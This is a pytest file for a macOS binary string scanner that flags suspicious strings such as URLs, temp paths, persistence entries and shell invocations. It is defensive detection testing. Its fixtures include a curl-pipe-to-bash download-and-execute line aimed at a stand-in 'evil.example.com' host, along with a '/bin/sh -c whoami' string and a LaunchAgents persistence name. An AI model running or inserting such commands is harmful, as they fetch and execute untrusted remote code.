"""Tests for the shared suspicious-string scanner.

``machopy.string_extractor`` is now an adapter over ``macskillet.common.strings``,
which the native pipeline uses too. These tests pin the behaviours that were
previously wrong, so a regression fails loudly:

* highest-risk category wins, not first-in-list
* findings are deduplicated and ranked before the result cap applies
* base64 is validated, not merely shape-matched
* read failures return an empty list, never a malformed finding
"""

import pytest

from macskillet.common.strings import (
    MIN_STRING_LEN,
    Risk,
    count_categories,
    is_base64,
    read_strings,
    scan,
)
from macskillet.machopy.string_extractor import (
    SUSPICIOUS_PATTERNS,
    extract_string_counts,
    extract_strings_of_interest,
)


def _make_binary(strings: list[str], tmp_path, name="test_bin") -> str:
    """Write a fake binary containing the given ASCII strings, null-separated."""
    path = tmp_path / name
    data = b"\x00\x00\x00\x00"  # non-Mach-O header
    for s in strings:
        data += s.encode("ascii") + b"\x00"
    path.write_bytes(data)
    return str(path)


def _categories(results) -> list[str]:
    return [r["category"] for r in results]


# ---------------------------------------------------------------------------
# Pattern table
# ---------------------------------------------------------------------------

def test_suspicious_patterns_is_list():
    assert isinstance(SUSPICIOUS_PATTERNS, list)
    assert len(SUSPICIOUS_PATTERNS) > 0


def test_suspicious_patterns_entries_are_well_formed():
    seen = set()
    for spec in SUSPICIOUS_PATTERNS:
        assert isinstance(spec.category, str) and spec.category
        assert isinstance(spec.pattern, str) and spec.pattern
        assert spec.risk in (Risk.HIGH, Risk.MEDIUM, Risk.LOW)
        assert isinstance(spec.description, str) and spec.description
        spec.compile()  # must be a valid regex
        assert spec.category not in seen, f"duplicate category {spec.category}"
        seen.add(spec.category)


def test_sandbox_entitlement_is_not_an_anti_vm_signal():
    """Regression: 'sandbox' in the anti_vm pattern flagged every sandboxed app."""
    results = scan(["<key>com.apple.security.app-sandbox</key>"])
    assert "anti_vm" not in _categories(results)


def test_chmod_does_not_match_inside_identifiers():
    """Regression: case-insensitive 'chmod' matched 'SwitchModeProgrammer'."""
    results = scan(["SwitchModeProgrammerToScientific", "SwitchModeScientificToBasic"])
    assert results == []


# ---------------------------------------------------------------------------
# Detection
# ---------------------------------------------------------------------------

def test_url_string_detected(tmp_path):
    results = extract_strings_of_interest(
        _make_binary(["https://malware.example.com/payload"], tmp_path)
    )
    assert "url" in _categories(results)


def test_tmp_path_detected(tmp_path):
    results = extract_strings_of_interest(_make_binary(["/tmp/evil_dropper"], tmp_path))
    assert "tmp_path" in _categories(results)


def test_persistence_string_detected(tmp_path):
    results = extract_strings_of_interest(
        _make_binary(["LaunchAgents/com.evil.plist"], tmp_path)
    )
    assert "persistence" in _categories(results)


def test_ip_address_detected(tmp_path):
    results = extract_strings_of_interest(
        _make_binary(["connect to 192.168.1.100 for C2"], tmp_path)
    )
    assert "ip_address" in _categories(results)


def test_shell_invocation_detected(tmp_path):
    results = extract_strings_of_interest(_make_binary(["/bin/sh -c whoami"], tmp_path))
    assert "shell_invocation" in _categories(results)


def test_download_execute_detected(tmp_path):
    results = extract_strings_of_interest(
        _make_binary(["curl -fsSL https://evil.example.com/s.sh | bash"], tmp_path)
    )
    assert "download_execute" in _categories(results)


def test_clean_binary_returns_no_suspicious_strings(tmp_path):
    results = extract_strings_of_interest(
        _make_binary(["hello world", "normal string here"], tmp_path)
    )
    assert results == [], f"unexpected flags: {results}"


# ---------------------------------------------------------------------------
# Ranking, dedup and capping
# ---------------------------------------------------------------------------

def test_highest_risk_category_wins_over_list_order():
    """A download-execute string must not be filed as a mere 'url'.

    The old scanner broke on the first matching pattern, so list order decided
    the category and this string scored MEDIUM/url.
    """
    results = scan(["curl -fsSL https://evil.example.com/p.sh | bash"])
    assert len(results) == 1
    assert results[0]["category"] == "download_execute"
    assert results[0]["risk"] == Risk.HIGH
    assert "url" in results[0]["all_categories"]


def test_findings_are_deduplicated_with_occurrence_count():
    results = scan(["/tmp/dropper"] * 5)
    assert len(results) == 1
    assert results[0]["occurrences"] == 5


def test_results_ranked_high_risk_first():
    results = scan([
        "https://benign.example.com/asset",
        "/tmp/stage-two-payload",
    ])
    assert [r["risk"] for r in results] == [Risk.HIGH, Risk.MEDIUM]


def test_cap_keeps_highest_risk_not_file_order():
    """The cap applies after ranking, so severe findings survive truncation."""
    noise = [f"https://cdn.example.com/asset-{i}" for i in range(50)]
    results = scan(noise + ["/tmp/payload"], max_results=1)
    assert len(results) == 1
    assert results[0]["category"] == "tmp_path"


def test_value_truncated(tmp_path):
    long_url = "https://evil.example.com/" + "a" * 300
    results = extract_strings_of_interest(_make_binary([long_url], tmp_path))
    assert results
    for r in results:
        assert len(r["value"]) <= 250


# ---------------------------------------------------------------------------
# base64 validation
# ---------------------------------------------------------------------------

def test_is_base64_accepts_real_payload():
    import base64 as b64

    blob = b64.b64encode(bytes(range(64))).decode()
    assert is_base64(blob)


@pytest.mark.parametrize("value", [
    "observationRegistrar",                      # English identifier
    "s10AppIntents0A4EnumP8RawValueSY",          # Swift mangled symbol
    "_ZN9SomeClass6methodEv",                    # C++ Itanium mangled symbol
    "short",                                     # too short
    "abcdefghijklmnopqrstuvwxyzABCDEF!",         # invalid charset
])
def test_is_base64_rejects_non_payloads(value):
    assert not is_base64(value)


def test_swift_symbols_not_reported_as_base64():
    """Regression: 3644 of 3670 findings on Calculator.app were bogus base64."""
    symbols = [
        "s10AppIntents0A5ValuePAA24PersistentlyIdentifiableTb",
        "s10AppIntents10OpenIntentPAAE7performQryYaKF",
        "_$observationRegistrar",
    ]
    assert scan(symbols) == []


# ---------------------------------------------------------------------------
# Error handling
# ---------------------------------------------------------------------------

def test_missing_file_returns_empty_list():
    """Errors must not be smuggled into the findings list.

    The old version appended {"error": ...} entries with no category/risk keys,
    which broke every consumer that iterated over results.
    """
    assert extract_strings_of_interest("/nonexistent/binary") == []


def test_missing_file_counts_are_empty():
    assert extract_string_counts("/nonexistent/binary") == {}


def test_read_strings_raises_on_missing_file():
    with pytest.raises(OSError):
        list(read_strings("/nonexistent/binary"))


# ---------------------------------------------------------------------------
# Streaming extraction
# ---------------------------------------------------------------------------

def test_read_strings_finds_strings_across_chunk_boundaries(tmp_path):
    """Chunked reads must not lose a string that straddles a boundary."""
    from macskillet.common import strings as strings_mod

    marker = "/tmp/boundary-straddling-payload"
    path = tmp_path / "big"
    filler = b"\x00" * (strings_mod._CHUNK_SIZE - 5)
    path.write_bytes(filler + marker.encode() + b"\x00" * 32)

    results = extract_strings_of_interest(str(path))
    assert "tmp_path" in _categories(results)


def test_short_runs_below_min_length_ignored(tmp_path):
    results = extract_strings_of_interest(_make_binary(["ab", "cd"], tmp_path))
    assert results == []
    assert MIN_STRING_LEN >= 4


# ---------------------------------------------------------------------------
# Numeric counts shared with the ML feature vector
# ---------------------------------------------------------------------------

def test_count_categories_matches_scan_categories():
    sample = [
        "https://evil.example.com/a",
        "/tmp/payload",
        "192.168.1.1",
    ]
    counts = count_categories(sample)
    assert counts["network"] >= 2       # url + ip_address
    assert counts["tmp_path"] == 1
    assert counts["filesystem_path"] >= 1


def test_extract_string_counts_uses_same_table(tmp_path):
    path = _make_binary(["/tmp/payload", "https://evil.example.com/a"], tmp_path)
    counts = extract_string_counts(path)
    findings = _categories(extract_strings_of_interest(path))
    assert counts.get("tmp_path") == 1
    assert "tmp_path" in findings


@pytest.mark.integration
def test_real_binary_returns_list():
    """System binary should produce a valid (possibly empty) result list."""
    results = extract_strings_of_interest("/bin/ls")
    assert isinstance(results, list)
    for r in results:
        assert set(r) >= {"value", "category", "risk"}
